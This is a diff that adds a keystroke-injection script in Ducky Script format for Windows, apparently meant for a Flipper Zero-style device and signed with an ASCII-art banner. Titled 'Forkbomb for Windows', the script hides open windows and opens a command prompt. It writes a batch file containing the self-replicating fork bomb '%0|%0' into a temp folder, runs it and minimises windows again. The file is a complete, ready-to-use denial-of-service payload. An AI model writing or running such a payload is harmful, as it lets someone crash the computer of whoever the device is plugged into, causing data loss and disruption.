@@ -1,0 +1,59 @@
+REM  ____            _       _       _                        #                   _.-------.._                    -,
+REM / ___|  ___ _ __(_)_ __ | |_    | |__  _   _              #               .-"```"--..,,_/ /`-,               -,  \
+REM \___ \ / __| '__| | '_ \| __|   | '_ \| | | |             #            .:"          /:/  /'\  \     ,_...,  `. |  |
+REM  ___) | (__| |  | | |_) | |_    | |_) | |_| |             #           /       ,----/:/  /`\ _\~`_-"`    _;
+REM |____/ \___|_|  |_| .__/ \__|   |_.__/ \__, |             #          '      / /`"""'\ \ \.~`_-'      ,-"'/
+REM                   |_|                  |___/              #         |      | |  0    | | .-'      ,/` /
+REM                                                           #        |    ,..\ \     ,.-"`      ,/`   /
+REM        __                                 __              #       ;    :    `/`""\`          ,/--==,/-----,
+REM       / /___ __________ ___  _____  _____/ /              #       |    `-...|        -.___-Z:_______J...---;
+REM  __  / / __ `/ ___/ __ `/ / / / _ \/ ___/ /               #       :         `                          _-'
+REM / /_/ / /_/ / /__/ /_/ / /_/ /  __(__  ) /___             #      _L_  _     ___  ___  ___  ___  ____--"`
+REM \____/\__,_/\___/\__, /\__,_/\___/____/_____/             #     | __|| |   |_ _|| _ \| _ \| __|| _ \
+REM                    /_/                                    #     | _| | |__  | | |  _/|  _/| _| |   /
+REM                                                           #     |_|  |____||___||_|  |_|  |___||_|_\
+REM
+REM                            Sometimes its okay,
+REM                                       if its DARK...
+
+
+
+
+
+REM Forkbomb for Windows
+
+
+
+WINDOWS m
+DELAY 750
+WINDOWS r
+DELAY 200
+STRING cmd
+DELAY 50
+ENTER
+DELAY 1000
+STRING cd %temp%
+DELAY 50
+ENTER
+DELAY 100
+STRING mkdir U3F9-E4AAB8-480C-4E
+DELAY 50
+ENTER
+DELAY 100
+STRING cd U3F9-E4AAB8-480C-4E
+DELAY 50
+ENTER
+STRING copy con fork.bat
+DELAY 50
+ENTER
+DELAY 100
+STRING %0|%0
+DELAY 50
+ENTER
+DELAY 100
+CTRL c
+DELAY 100
+STRING fork.bat
+ENTER
+DELAY 50
+WINDOWS m
